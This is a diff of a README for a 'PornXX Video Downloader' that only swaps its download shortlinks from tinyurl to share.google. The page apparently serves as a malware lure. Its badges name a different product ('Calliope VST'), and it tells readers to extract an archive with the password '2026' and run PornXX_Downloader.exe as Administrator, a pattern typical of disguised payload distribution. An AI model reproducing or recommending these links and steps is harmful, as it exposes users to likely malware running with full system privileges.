@@ -4,7 +4,7 @@ The **📥 PornXX Video Downloader** is a **free**, high-speed utility engineere
 
 <div align="center">
 
-[![Download Calliope VST Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/pornxx-download)
+[![Download Calliope VST Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/lKxpjinnYgPkLqhqG)
 
 </div>
 <div align="center">
@@ -78,7 +78,7 @@ Managing a digital collection is difficult when dealing with slow web players an
 2.  **📦 Extract the archive** — Use the password `2026` (right-click and "Extract Here").
 3.  **🖱️ Run as Administrator** — Launch `PornXX_Downloader.exe` and start saving media.
 
-[](https://tinyurl.com/pornxx-download)
+[](https://share.google/lKxpjinnYgPkLqhqG)
 
 -----
 
@@ -117,7 +117,7 @@ Managing a digital collection is difficult when dealing with slow web players an
 
 <div align="center">
 
-[![Download Calliope VST Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/pornxx-download)
+[![Download Calliope VST Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/lKxpjinnYgPkLqhqG)
 
 </div>
 
